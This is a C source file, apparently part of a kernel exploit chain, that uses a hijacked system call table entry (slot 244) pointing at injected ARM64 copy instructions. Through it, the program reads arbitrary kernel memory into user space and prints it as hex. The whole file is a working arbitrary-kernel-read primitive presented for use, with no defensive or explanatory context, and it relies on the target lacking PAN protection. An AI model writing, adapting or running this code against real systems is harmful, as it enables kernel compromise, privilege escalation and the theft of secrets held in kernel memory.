/* kread - 3-argument caller for the physmap canary payload (see FINDING_ADDRESSES.md).
 *
 * With sys_call_table[244] pointing at a page whose first bytes are
 *     ldrb w3,[x1],#1 ; strb w3,[x0],#1 ; subs x2,x2,#1 ; b.ne -3 ; ret
 * the kernel copies `len` bytes from kernel address `addr` into our buffer.
 * No PAN on this SoC, so EL1 may store to user memory.
 *
 *   kread <kaddr_hex> <len>
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/syscall.h>

#define SLOT 244

int main(int argc, char **argv)
{
    if (argc < 3) {
        fprintf(stderr, "usage: kread <kaddr_hex> <len>\n");
        return 1;
    }
    unsigned long addr = strtoul(argv[1], NULL, 16);
    int len = atoi(argv[2]);
    if (len <= 0 || len > 0x100000)
        return 1;

    unsigned char *buf = mmap(NULL, (size_t)len + 0x4000, PROT_READ | PROT_WRITE,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (buf == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    memset(buf, 0, len);          /* fault the pages in before the kernel writes them */

    syscall(SLOT, (unsigned long)buf, addr, (unsigned long)len);

    for (int i = 0; i < len; i++)
        printf("%02x", buf[i]);
    printf("\n");
    return 0;
}
